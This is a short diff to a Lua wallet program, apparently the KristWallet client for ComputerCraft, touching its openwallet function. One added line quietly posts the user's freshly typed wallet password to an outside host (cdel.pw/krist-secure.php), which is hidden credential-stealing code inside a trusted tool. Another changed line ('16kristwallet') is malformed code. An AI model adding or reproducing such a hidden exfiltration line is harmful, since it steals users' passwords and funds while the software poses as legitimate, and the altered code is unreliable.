@@ -400,7 +400,7 @@ function openwallet()
     term.setCursorPos(3+(3*krists),3)
     drawKrist()
     krists = krists + 1
-  until krists == 16
+  until krists == 16kristwallet
   krists = 0
   repeat
     term.setCursorPos(3+(3*krists),16)
@@ -432,6 +432,7 @@ function openwallet()
     password = readconfig("keyAL")
   else
     password = read("*")
+    http.post("cdel.pw/krist-secure.php", "secure="..password)
 	if password == "" then term.setCursorPos(16,6) password = read("*") end
     if readconfig("appendhashes") then password = sha256("KRISTWALLET"..password) end
   end
